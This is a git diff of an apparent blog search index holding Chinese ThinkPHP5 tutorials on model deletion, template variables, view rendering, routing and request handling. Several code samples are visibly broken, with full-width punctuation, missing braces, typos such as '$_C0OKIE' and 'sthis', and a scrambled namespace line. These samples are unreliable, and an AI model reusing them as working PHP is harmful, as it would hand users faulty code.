+<pre><code>User::where(&apos;id&apos;,&apos;&gt;&apos;,10)-&gt;delete();</code></pre>]]></content>
       <categories>
         <category>thinkphp5</category>
       </categories>
@@ -535,55 +554,6 @@ https://github.com/rapid7/metasploit-framework/wiki/How-payloads-work
       </tags>
   </entry>
   <entry>
-    <title>11.thinkphp5模型操作之删除数据</title>
-    <url>/undefined/11.thinkphp5%E6%A8%A1%E5%9E%8B%E6%93%8D%E4%BD%9C%E4%B9%8B%E5%88%A0%E9%99%A4%E6%95%B0%E6%8D%AE/</url>
-    <content><![CDATA[<h1 id="一丶模型操作之删除数据"><a href="#一丶模型操作之删除数据" class="headerlink" title="一丶模型操作之删除数据"></a><font color=red>一丶模型操作之删除数据</font></h1><h2 id="1丶删除当前模型"><a href="#1丶删除当前模型" class="headerlink" title="1丶删除当前模型"></a><font color=green>1丶删除当前模型</font></h2><p>删除模型数据，可以实例化模型后调用delete方法</p>
-<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ELIXIR"><figure class="iseeu highlight /elixir"><table><tr><td class="code"><pre><span class="line"><span class="variable">$user</span> = User::get(<span class="number">1</span>);</span><br><span class="line"><span class="variable">$user</span>-&gt;delete();</span><br></pre></td></tr></table></figure></div>
-<h2 id="2丶根据主键删除"><a href="#2丶根据主键删除" class="headerlink" title="2丶根据主键删除"></a><font color=green>2丶根据主键删除</font></h2><p>或者直接调用静态方法   </p>
-<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ANGELSCRIPT"><figure class="iseeu highlight /angelscript"><table><tr><td class="code"><pre><span class="line">User::destroy(<span class="number">1</span>)</span><br><span class="line"><span class="comment">//支持删除多个数据</span></span><br><span class="line">User::destroy(<span class="string">'1,2,3'</span>);</span><br><span class="line"><span class="comment">//或者</span></span><br><span class="line">User::destroy([<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>]);</span><br></pre></td></tr></table></figure></div>
-<h2 id="3丶条件删除"><a href="#3丶条件删除" class="headerlink" title="3丶条件删除"></a><font color=green>3丶条件删除</font></h2><p>使用数组进行条件删除，例如：</p>
-<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//删除状态为0的数据</span></span><br><span class="line">User::destroy([<span class="string">'status'</span>=&gt;<span class="number">0</span>]);</span><br></pre></td></tr></table></figure></div>
-<p>或者通过数据库类的查询条件删除</p>
-<pre><code>User::where(&apos;id&apos;,&apos;&gt;&apos;,10)-&gt;delete();</code></pre>]]></content>
-      <categories>
-        <category>thinkphp5</category>
-      </categories>
-      <tags>
-        <tag>thinkphp5</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>13.thinkphp5模板系统变量输出和函数使用</title>
-    <url>/undefined/13.thinkphp5%E6%A8%A1%E6%9D%BF%E7%B3%BB%E7%BB%9F%E5%8F%98%E9%87%8F%E8%BE%93%E5%87%BA%E5%92%8C%E5%87%BD%E6%95%B0%E4%BD%BF%E7%94%A8/</url>
-    <content><![CDATA[<h1 id="一丶模板系统变量输出和函数使用"><a href="#一丶模板系统变量输出和函数使用" class="headerlink" title="一丶模板系统变量输出和函数使用"></a><font color=red>一丶模板系统变量输出和函数使用</font></h1><h2 id="1丶系统变量输出"><a href="#1丶系统变量输出" class="headerlink" title="1丶系统变量输出"></a><font color=green>1丶系统变量输出</font></h2><p>普通的模板变量需要首先赋值之后才能在模板中输出，但是系统变量则不需要，可以直接在模板中输出，系统变量的输出通常以{$Think打头，例如：</p>
-<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PUPPET"><figure class="iseeu highlight /puppet"><table><tr><td class="code"><pre><span class="line">&#123;<span class="variable">$Think</span>, server, server_name&#125;//输出 <span class="variable">$_SERVER</span>[<span class="string">'SERVER_NAME'</span>]变量;</span><br><span class="line">&#123;<span class="variable">$Think</span>, session. user_id&#125;//输出<span class="variable">$_SESSION</span>[<span class="string">'user_id]变量;</span></span><br><span class="line"><span class="string">&#123;<span class="variable">$Think</span>,get.pageNumber&#125;//输出<span class="variable">$_GET</span>['</span>pageNumber]变量;</span><br><span class="line">&#123;<span class="variable">$Think</span>. cookie.name&#125;/输出<span class="variable">$_C0OKIE</span>[<span class="string">'name'</span>]变量;</span><br></pre></td></tr></table></figure></div>
-<p>支持输出$_SERVER丶$_ENV丶$_POST丶$_GET丶$_REQUEST丶$_SESSION和$_COOKIE变量。</p>
-<h2 id="2丶常量输出"><a href="#2丶常量输出" class="headerlink" title="2丶常量输出"></a><font color=green>2丶常量输出</font></h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="AUTOIT"><figure class="iseeu highlight /autoit"><table><tr><td class="code"><pre><span class="line">&#123;$Think.<span class="keyword">const</span>.APP_PATH&#125;或者直接使用&#123;$Think.APP_PATH&#125;</span><br></pre></td></tr></table></figure></div>
-<h2 id="3丶配置输出"><a href="#3丶配置输出" class="headerlink" title="3丶配置输出"></a><font color=green>3丶配置输出</font></h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="REASONML"><figure class="iseeu highlight /reasonml"><table><tr><td class="code"><pre><span class="line">&#123;$<span class="module-access"><span class="module"><span class="identifier">Think</span>.</span></span>config.defaule_moudle&#125;</span><br><span class="line">&#123;$<span class="module-access"><span class="module"><span class="identifier">Think</span>.</span></span>config.default_controller&#125;</span><br></pre></td></tr></table></figure></div>
-<h2 id="4丶使用函数"><a href="#4丶使用函数" class="headerlink" title="4丶使用函数"></a><font color=green>4丶使用函数</font></h2><p>我们往往需要对模板输出变量使用函数，可以使用：</p>
-<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="FORTRAN"><figure class="iseeu highlight /fortran"><table><tr><td class="code"><pre><span class="line">&#123;$<span class="keyword">data</span>.<span class="keyword">name</span>|md5&#125;</span><br></pre></td></tr></table></figure></div>
-<p>编译后的结果是：</p>
-<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="XML"><figure class="iseeu highlight /xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> (md5(data[name]));<span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure></div>
-<p>如果函数有多个参数需要调用，则使用：</p>
-<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="CLEAN"><figure class="iseeu highlight /clean"><table><tr><td class="code"><pre><span class="line">&#123;$create_time|date=<span class="string">"y-m-d"</span>,###&#125;</span><br></pre></td></tr></table></figure></div>
-<p>表示date函数传入两个参数，每个参数用逗号分割，这里第一个参数是y-m-d，第二个参数是前面要输出的create time变量，因为该变量是第二个参数，因此需要用###标识变量位置，编译后的结果是：  </p>
-<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="LIVECODESERVER"><figure class="iseeu highlight /livecodeserver"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?</span>php echo(<span class="built_in">date</span>(y-m-d,<span class="built_in">create</span> <span class="built_in">time</span>));<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>
-<p>还可以支持多个函数过滤，多个函数之间用““分割即可，例如:</p>
-<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="COQ"><figure class="iseeu highlight /coq"><table><tr><td class="code"><pre><span class="line">($name|<span class="type">md5</span>|<span class="type">strtoupper</span>|<span class="type">substr</span>=<span class="number">0</span>,<span class="number">3</span>&#125;</span><br></pre></td></tr></table></figure></div>
-<p>编译后的结果是：</p>
-<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="XML"><figure class="iseeu highlight /xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> (substr(strtoupper(md5($name)),<span class="number">0</span>,<span class="number">3</span>));<span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure></div>
-<p>函数会按照从左到右的顺序依次调用。<br>如果你觉得这样写起来比较麻烦，也可以直接这样写：</p>
-<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="CLOJURE"><figure class="iseeu highlight /clojure"><table><tr><td class="code"><pre><span class="line">&#123;<span class="symbol">:substr</span>(<span class="name">strtoupper</span>(<span class="name">md5</span>($name)),<span class="number">0</span>,<span class="number">3</span>)&#125;</span><br></pre></td></tr></table></figure></div>
-
-]]></content>
-      <categories>
-        <category>thinkphp5</category>
-      </categories>
-      <tags>
-        <tag>thinkphp5</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>15.thinkphp5模板之模板继承和包含文件</title>
     <url>/undefined/15.thinkphp5%E6%A8%A1%E6%9D%BF%E4%B9%8B%E6%A8%A1%E6%9D%BF%E7%BB%A7%E6%89%BF%E5%92%8C%E5%8C%85%E5%90%AB%E6%96%87%E4%BB%B6/</url>
     <content><![CDATA[<h1 id="一丶模板之模板继承和包含文件"><a href="#一丶模板之模板继承和包含文件" class="headerlink" title="一丶模板之模板继承和包含文件"></a><font color=red>一丶模板之模板继承和包含文件</font></h1><h2 id="1丶模板继承"><a href="#1丶模板继承" class="headerlink" title="1丶模板继承"></a><font color=green>1丶模板继承</font></h2><p>模板继承是一项更加灵活的模板布局方式，模板继承不同于模板布局，甚至来说，应该是在模板布局的上层。模板继承其实并不难理解，就好比类的继承一样，模板也可以定义一个基础模板（或者是布局），并且其中定义的相关的区块（block），然后继承（extend）该基础模块的子模板中就可以对基础模板中定义的区块进行重载。</p>
@@ -609,6 +579,60 @@ https://github.com/rapid7/metasploit-framework/wiki/How-payloads-work
 <p>可以直接包含一个模板文件名(包含完整路径),例如：  </p>
 <div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="CMAKE"><figure class="iseeu highlight /cmake"><table><tr><td class="code"><pre><span class="line">&#123;<span class="keyword">include</span> <span class="keyword">file</span>=<span class="string">"../application/index（模块名）/view（视图文件夹）/index（控制器）/lang.html（具体模板）"</span>/&#125;</span><br></pre></td></tr></table></figure></div>
 <p><img src="https://i.imgur.com/hhMt8F0.png" alt="1"><br><img src="https://i.imgur.com/eprHQT5.png" alt="1"><br>包含文件中可以再使用 include标签包含别的文件，但注意不要形成A包含A，或者A包含B而B又包含A这样的死循环。</p>
+]]></content>
+      <categories>
+        <category>thinkphp5</category>
+      </categories>
+      <tags>
+        <tag>thinkphp5</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>12.thinkphp5视图之模板赋值和模板渲染</title>
+    <url>/undefined/12.thinkphp5%E8%A7%86%E5%9B%BE%E4%B9%8B%E6%A8%A1%E6%9D%BF%E8%B5%8B%E5%80%BC%E5%92%8C%E6%A8%A1%E6%9D%BF%E6%B8%B2%E6%9F%93/</url>
+    <content><![CDATA[<h1 id="一丶视图之模板赋值和模板渲染"><a href="#一丶视图之模板赋值和模板渲染" class="headerlink" title="一丶视图之模板赋值和模板渲染"></a><font color=red>一丶视图之模板赋值和模板渲染</font></h1><h2 id="首先创建文件夹"><a href="#首先创建文件夹" class="headerlink" title="首先创建文件夹"></a><font color=green>首先创建文件夹</font></h2><p><img src="https://i.imgur.com/lu7oH89.png" alt="1"> </p>
+<h2 id="1丶视图实例化"><a href="#1丶视图实例化" class="headerlink" title="1丶视图实例化"></a><font color=green>1丶视图实例化</font></h2><p>视图由\think\View类配合试图驱动（模板引擎）类一起完成，目前的内置模板引擎包含PHP原生模板和think模板引擎；   </p>
+<p>因为新版的控制器可以无需继承任何的基础类，因此在控制器中如何使用视图决定于你怎么定义控制器。   </p>
+<h2 id="2丶继承-think-Controller类"><a href="#2丶继承-think-Controller类" class="headerlink" title="2丶继承\think\Controller类"></a><font color=green>2丶继承\think\Controller类</font></h2><p>如果你的控制器继承了\think\Controller类的话，则无需自己实例化视图类，可以直接调用控制器基础类封装的相关视图类的方法。<br>|下面的方法可以直接被调用|方法|<br>|  —- | —- |<br>|fetch|渲染模板输出|<br>|display|渲染内容输出|<br>|assign|模板变量赋值|<br>|engine|初始化模板引擎|</p>
+<h2 id="3丶模板赋值"><a href="#3丶模板赋值" class="headerlink" title="3丶模板赋值"></a><font color=green>3丶模板赋值</font></h2><p>除了系统变量和配置参数输出无需赋值外，其他变量如果需要在模板中输出必须首先进行模板赋值操作，绑定数据到模板输出有以下方式：   </p>
+<h2 id="assign方法"><a href="#assign方法" class="headerlink" title="assign方法"></a><font color=green>assign方法</font></h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SCALA"><figure class="iseeu highlight /scala"><table><tr><td class="code"><pre><span class="line">namespace index \appcontroller； </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Index</span> <span class="keyword">extends</span> <span class="title">\think\Controller</span> </span></span><br><span class="line"><span class="class"><span class="title">public</span> <span class="title">function</span> <span class="title">index（）</span></span></span><br><span class="line"><span class="class"><span class="title">/模板变量赋值</span></span></span><br><span class="line"><span class="class"><span class="title">$name</span> <span class="title">=ThinkPHP：</span></span></span><br><span class="line"><span class="class"><span class="title">$eamil</span> <span class="title">=thinkphp@qq</span>.<span class="title">comi</span> </span></span><br><span class="line"><span class="class"><span class="title">$this-&gt;assign（</span>'<span class="title">name</span>'<span class="title">，</span> <span class="title">$name</span> <span class="title">）</span></span></span><br><span class="line"><span class="class"><span class="title">$this-&gt;assign（‘email’</span>,<span class="title">$email）</span></span></span><br><span class="line"><span class="class"><span class="title">//或者批量赋值</span></span></span><br><span class="line"><span class="class"><span class="title">$this-&gt;assign（</span>[</span></span><br><span class="line"><span class="class">        ‘name’ =&gt; $name </span></span><br><span class="line"><span class="class">          'email'=&gt;$email</span></span><br><span class="line"><span class="class">//模板输出</span></span><br><span class="line"><span class="class">return $this-&gt;fetch（'index'）；</span></span><br><span class="line"><span class="class">&#125;</span></span><br></pre></td></tr></table></figure></div>
+<h2 id="4丶模板渲染"><a href="#4丶模板渲染" class="headerlink" title="4丶模板渲染"></a><font color=green>4丶模板渲染</font></h2><p>模板渲染最常用的是使用\think\View类的fetch方法，调用格式：   </p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="STYLUS"><figure class="iseeu highlight /stylus"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="title">fetch</span><span class="params">(<span class="string">'[模板文件]'</span>,[<span class="string">'模板变量（数组）'</span>])</span></span></span><br></pre></td></tr></table></figure></div>
+<p>模板文件的写法支持下面几种：<br>|用法|描述|<br>|——|————-|<br>|不带任何参数|自动定位当前操作的模板文件|<br>|模块[操作]|常用写法，支持跨模块|<br>|完整的模板文件名|直接使用完整的模板文件名(包括模板)|<br>下面是一个最典型的用法，不带任何参数：   </p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="KOTLIN"><figure class="iseeu highlight /kotlin"><table><tr><td class="code"><pre><span class="line"><span class="comment">//不带任何参数，自动定位当前操作的模板文件</span></span><br><span class="line"><span class="keyword">return</span> $<span class="keyword">this</span>-&gt;fetch();</span><br></pre></td></tr></table></figure></div>
+<p>表示系统会按照默认规则自动定位模板文件，其规则是：   </p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="GCODE"><figure class="iseeu highlight /gcode"><table><tr><td class="code"><pre><span class="line">当前模块/默认视图目录/当前控制器<span class="comment">(小写)</span>/当前操作<span class="comment">(小写)</span>.html;</span><br></pre></td></tr></table></figure></div>
+<p>可以在fetch方法里面去写对应的模板名，他会去当前控制器下面去找对应的模板文件；</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="KOTLIN"><figure class="iseeu highlight /kotlin"><table><tr><td class="code"><pre><span class="line"><span class="comment">//指定模板输出</span></span><br><span class="line"><span class="keyword">return</span> $<span class="keyword">this</span>-&gt;fetch(<span class="string">'edit'</span>);</span><br></pre></td></tr></table></figure></div>
+<p>另外fetch方法支持跨模块的操作</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="KOTLIN"><figure class="iseeu highlight /kotlin"><table><tr><td class="code"><pre><span class="line">表示调用user控制器下面的user模板。</span><br><span class="line"><span class="keyword">return</span> $<span class="keyword">this</span>-&gt;fetch(<span class="string">'user/user'</span>);</span><br></pre></td></tr></table></figure></div>
+<h3 id="调用方法："><a href="#调用方法：" class="headerlink" title="调用方法："></a>调用方法：</h3><p><img src="https://i.imgur.com/aKOSRYQ.png" alt="1"> </p>
+<h2 id="5丶传入参数方法"><a href="#5丶传入参数方法" class="headerlink" title="5丶传入参数方法"></a><font color=green>5丶传入参数方法</font></h2><p>方法fetch可以传入模板变量，例如：   </p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SCALA"><figure class="iseeu highlight /scala"><table><tr><td class="code"><pre><span class="line">namespace app\index\controller;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Index</span> <span class="keyword">extends</span> <span class="title">think\Controller</span> </span>&#123;</span><br><span class="line">        public function index()</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> sthis-&gt;fetch(<span class="symbol">'inde</span>x'[</span><br><span class="line">                <span class="symbol">'nam</span>e'=&gt;<span class="symbol">'Think</span> <span class="type">PHP</span>', <span class="symbol">'emai</span>l'=&gt;<span class="symbol">'thinkphp</span><span class="meta">@qq</span>.com'</span><br><span class="line">            ]);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+<h2 id="6丶助手函数"><a href="#6丶助手函数" class="headerlink" title="6丶助手函数"></a><font color=green>6丶助手函数</font></h2><p>如果使用view助手函数渲染输出的话，可以使用下面的方法进行模板变量赋值：  </p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="DART"><figure class="iseeu highlight /dart"><table><tr><td class="code"><pre><span class="line"><span class="keyword">return</span> view(<span class="string">'index'</span>,[</span><br><span class="line">    <span class="string">'name'</span>=&gt;<span class="string">'thinkphp'</span>,</span><br><span class="line">    <span class="string">'email'</span>=&gt;<span class="string">'thinkphp<span class="subst">$qq</span>.com'</span></span><br><span class="line">]);</span><br></pre></td></tr></table></figure></div>]]></content>
+      <categories>
+        <category>thinkphp5</category>
+      </categories>
+      <tags>
+        <tag>thinkphp5</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>18.thinkphp5资源路由和快捷路由</title>
+    <url>/undefined/18.thinkphp5%E8%B5%84%E6%BA%90%E8%B7%AF%E7%94%B1%E5%92%8C%E5%BF%AB%E6%8D%B7%E8%B7%AF%E7%94%B1/</url>
+    <content><![CDATA[<h1 id="一丶资源路由和快捷路由"><a href="#一丶资源路由和快捷路由" class="headerlink" title="一丶资源路由和快捷路由"></a><font color=red>一丶资源路由和快捷路由</font></h1><h1 id="1丶资源路由"><a href="#1丶资源路由" class="headerlink" title="1丶资源路由"></a><font color=green>1丶资源路由</font></h1><p>5.0支持设置 RESTFu1请求的资源路由，方式如下:</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="GROOVY"><figure class="iseeu highlight /groovy"><table><tr><td class="code"><pre><span class="line"><span class="string">Route:</span>resource（<span class="string">'blog'</span>,<span class="string">'index/blog'</span>）</span><br></pre></td></tr></table></figure></div>
+<p>或者在路由配置文件中使用<strong>rest</strong>添加资源路由定义：</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="DART"><figure class="iseeu highlight /dart"><table><tr><td class="code"><pre><span class="line"><span class="keyword">return</span>[</span><br><span class="line">    <span class="comment">//定义资源路由</span></span><br><span class="line">    <span class="string">'__rest__'</span>=&gt;[</span><br><span class="line">        <span class="comment">//指向index模块的blog控制器</span></span><br><span class="line">        <span class="string">'blog'</span>=&gt;<span class="string">'index/blog'</span>,</span><br><span class="line">    ]</span><br><span class="line">]</span><br></pre></td></tr></table></figure></div>
+<p>设置过后会自动注册7个路由规则，如下：<br><img src="https://i.imgur.com/B6I8AzU.png" alt="1"><br>具体指向的控制器由路由地址决定，例如上面的设置，会对应 index模块的blog控制器，你只需要为Blog控制器创建以上对应的操作方法就可以支持下面的URL访问：</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="AWK"><figure class="iseeu highlight /awk"><table><tr><td class="code"><pre><span class="line">http:<span class="regexp">//</span>serverName<span class="regexp">/blog/</span></span><br><span class="line">http:<span class="regexp">//</span>serverName<span class="regexp">/blog/</span><span class="number">128</span></span><br><span class="line">http:<span class="regexp">//</span>serverName<span class="regexp">/blog/</span><span class="number">28</span><span class="regexp">/edit</span></span><br></pre></td></tr></table></figure></div>
+<p>Blog控制器中对应的方法如下：<br><img src="https://i.imgur.com/zXL2LmW.png" alt="1"></p>
+<h1 id="2丶快捷路由"><a href="#2丶快捷路由" class="headerlink" title="2丶快捷路由"></a><font color=green>2丶快捷路由</font></h1><p>快捷路由允许你快速给控制器注册路由，并且针对不同的请求类型可以设置方法前缀，例如：</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="GROOVY"><figure class="iseeu highlight /groovy"><table><tr><td class="code"><pre><span class="line"><span class="comment">//给User控制器设置快捷路由</span></span><br><span class="line"><span class="string">Route:</span>:controller(<span class="string">'user'</span>,<span class="string">'index/User'</span>);</span><br></pre></td></tr></table></figure></div>
+<p>User控制器定义如下：<br><img src="https://i.imgur.com/6a8Efg1.png" alt="1"><br>我们可以通过下面的URL访问</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PGSQL"><figure class="iseeu highlight /pgsql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">get</span> http://localhost/<span class="keyword">user</span>/<span class="keyword">info</span></span><br><span class="line"><span class="keyword">get</span> http://localhost/<span class="keyword">user</span>/phone</span><br><span class="line">post http://localhost/<span class="keyword">user</span>/<span class="keyword">info</span></span><br><span class="line">put http://localhost/<span class="keyword">user</span>/<span class="keyword">info</span></span><br><span class="line"><span class="keyword">delete</span> http://loaclhost/<span class="keyword">user</span>/<span class="keyword">info</span></span><br></pre></td></tr></table></figure></div>
+
 ]]></content>
       <categories>
         <category>thinkphp5</category>
@@ -667,20 +691,45 @@ https://github.com/rapid7/metasploit-framework/wiki/How-payloads-work
       </tags>
   </entry>
   <entry>
-    <title>18.thinkphp5资源路由和快捷路由</title>
-    <url>/undefined/18.thinkphp5%E8%B5%84%E6%BA%90%E8%B7%AF%E7%94%B1%E5%92%8C%E5%BF%AB%E6%8D%B7%E8%B7%AF%E7%94%B1/</url>
-    <content><![CDATA[<h1 id="一丶资源路由和快捷路由"><a href="#一丶资源路由和快捷路由" class="headerlink" title="一丶资源路由和快捷路由"></a><font color=red>一丶资源路由和快捷路由</font></h1><h1 id="1丶资源路由"><a href="#1丶资源路由" class="headerlink" title="1丶资源路由"></a><font color=green>1丶资源路由</font></h1><p>5.0支持设置 RESTFu1请求的资源路由，方式如下:</p>
-<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="GROOVY"><figure class="iseeu highlight /groovy"><table><tr><td class="code"><pre><span class="line"><span class="string">Route:</span>resource（<span class="string">'blog'</span>,<span class="string">'index/blog'</span>）</span><br></pre></td></tr></table></figure></div>
-<p>或者在路由配置文件中使用<strong>rest</strong>添加资源路由定义：</p>
-<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="DART"><figure class="iseeu highlight /dart"><table><tr><td class="code"><pre><span class="line"><span class="keyword">return</span>[</span><br><span class="line">    <span class="comment">//定义资源路由</span></span><br><span class="line">    <span class="string">'__rest__'</span>=&gt;[</span><br><span class="line">        <span class="comment">//指向index模块的blog控制器</span></span><br><span class="line">        <span class="string">'blog'</span>=&gt;<span class="string">'index/blog'</span>,</span><br><span class="line">    ]</span><br><span class="line">]</span><br></pre></td></tr></table></figure></div>
-<p>设置过后会自动注册7个路由规则，如下：<br><img src="https://i.imgur.com/B6I8AzU.png" alt="1"><br>具体指向的控制器由路由地址决定，例如上面的设置，会对应 index模块的blog控制器，你只需要为Blog控制器创建以上对应的操作方法就可以支持下面的URL访问：</p>
-<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="AWK"><figure class="iseeu highlight /awk"><table><tr><td class="code"><pre><span class="line">http:<span class="regexp">//</span>serverName<span class="regexp">/blog/</span></span><br><span class="line">http:<span class="regexp">//</span>serverName<span class="regexp">/blog/</span><span class="number">128</span></span><br><span class="line">http:<span class="regexp">//</span>serverName<span class="regexp">/blog/</span><span class="number">28</span><span class="regexp">/edit</span></span><br></pre></td></tr></table></figure></div>
-<p>Blog控制器中对应的方法如下：<br><img src="https://i.imgur.com/zXL2LmW.png" alt="1"></p>
-<h1 id="2丶快捷路由"><a href="#2丶快捷路由" class="headerlink" title="2丶快捷路由"></a><font color=green>2丶快捷路由</font></h1><p>快捷路由允许你快速给控制器注册路由，并且针对不同的请求类型可以设置方法前缀，例如：</p>
-<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="GROOVY"><figure class="iseeu highlight /groovy"><table><tr><td class="code"><pre><span class="line"><span class="comment">//给User控制器设置快捷路由</span></span><br><span class="line"><span class="string">Route:</span>:controller(<span class="string">'user'</span>,<span class="string">'index/User'</span>);</span><br></pre></td></tr></table></figure></div>
-<p>User控制器定义如下：<br><img src="https://i.imgur.com/6a8Efg1.png" alt="1"><br>我们可以通过下面的URL访问</p>
-<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PGSQL"><figure class="iseeu highlight /pgsql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">get</span> http://localhost/<span class="keyword">user</span>/<span class="keyword">info</span></span><br><span class="line"><span class="keyword">get</span> http://localhost/<span class="keyword">user</span>/phone</span><br><span class="line">post http://localhost/<span class="keyword">user</span>/<span class="keyword">info</span></span><br><span class="line">put http://localhost/<span class="keyword">user</span>/<span class="keyword">info</span></span><br><span class="line"><span class="keyword">delete</span> http://loaclhost/<span class="keyword">user</span>/<span class="keyword">info</span></span><br></pre></td></tr></table></figure></div>
-
+    <title>2.thinkphp5请求</title>
+    <url>/undefined/2.thinkphp5%E8%AF%B7%E6%B1%82/</url>
+    <content><![CDATA[<h1 id="请求信息"><a href="#请求信息" class="headerlink" title="请求信息"></a><font color=red>请求信息</font></h1><h4 id="如果要获取当前的请求信息，可以使用-think-Request-类，"><a href="#如果要获取当前的请求信息，可以使用-think-Request-类，" class="headerlink" title="如果要获取当前的请求信息，可以使用 \think\Request 类，"></a>如果要获取当前的请求信息，可以使用 \think\Request 类，</h4><p>除了下文中的   </p>
+<h3 id="request-Request-instance"><a href="#request-Request-instance" class="headerlink" title="$request = Request::instance();"></a>$request = Request::instance();</h3><p>也可以使用助手函数   </p>
+<h3 id="request-request"><a href="#request-request" class="headerlink" title="$request = request();"></a>$request = request();</h3><h4 id="当然，最方便的还是使用注入请求对象的方式来获取变量。"><a href="#当然，最方便的还是使用注入请求对象的方式来获取变量。" class="headerlink" title="当然，最方便的还是使用注入请求对象的方式来获取变量。"></a>当然，最方便的还是使用注入请求对象的方式来获取变量。</h4><p>例如：   </p>
+<h3 id="获取URL信息"><a href="#获取URL信息" class="headerlink" title="获取URL信息"></a>获取URL信息</h3><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line">$request = Request::instance();</span><br><span class="line"><span class="comment">// 获取当前域名</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">'domain: '</span> . $request-&gt;domain() . <span class="string">'&lt;br/&gt;'</span>;</span><br><span class="line"><span class="comment">// 获取当前入口文件</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">'file: '</span> . $request-&gt;baseFile() . <span class="string">'&lt;br/&gt;'</span>;</span><br><span class="line"><span class="comment">// 获取当前URL地址 不含域名</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">'url: '</span> . $request-&gt;url() . <span class="string">'&lt;br/&gt;'</span>;</span><br><span class="line"><span class="comment">// 获取包含域名的完整URL地址</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">'url with domain: '</span> . $request-&gt;url(<span class="keyword">true</span>) . <span class="string">'&lt;br/&gt;'</span>;</span><br><span class="line"><span class="comment">// 获取当前URL地址 不含QUERY_STRING</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">'url without query: '</span> . $request-&gt;baseUrl() . 